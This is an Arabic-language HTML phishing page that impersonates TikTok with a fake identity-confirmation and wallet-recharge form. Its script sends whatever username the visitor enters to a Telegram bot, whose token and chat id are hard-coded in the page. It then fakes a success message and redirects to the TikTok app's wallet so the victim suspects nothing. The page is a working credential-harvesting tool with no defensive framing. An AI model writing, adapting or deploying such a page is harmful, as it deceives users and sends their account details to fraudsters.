<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تأكيد الهوية - تيك توك</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 60px; }
        .box { border: 1px solid #333; padding: 30px; border-radius: 20px; max-width: 320px; margin: auto; background: #080808; }
        input { width: 90%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #444; background: #151515; color: #fff; text-align: center; }
        button { width: 95%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.tiktok.com/favicon.ico" width="45">
        <h2>نظام الشحن المباشر</h2>
        <input type="text" id="user" placeholder="أدخل اسم المستخدم">
        <button onclick="send()">دخول للمحفظة</button>
    </div>
    <script>
        function send() {
            var val = document.getElementById('user').value;
            if(!val) { alert("من فضلك اكتب اسم المستخدم"); return; }
            
            // بياناتك الجديدة
            var t = "8704286686:AAFj-ErXhFQxbfqalEfQtW8RoeCfi3Pc_QA";
            var i = "5533405786";
            var u = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=🚀 عميل جديد:\n" + encodeURIComponent(val);
            
            fetch(u).then(function() {
                alert("تم التأكيد! جاري تحويلك...");
                window.location.href = "snssdk1128://wallet";
            }).catch(function() {
                alert("خطأ في الاتصال");
            });
        }
    </script>
</body>
</html>
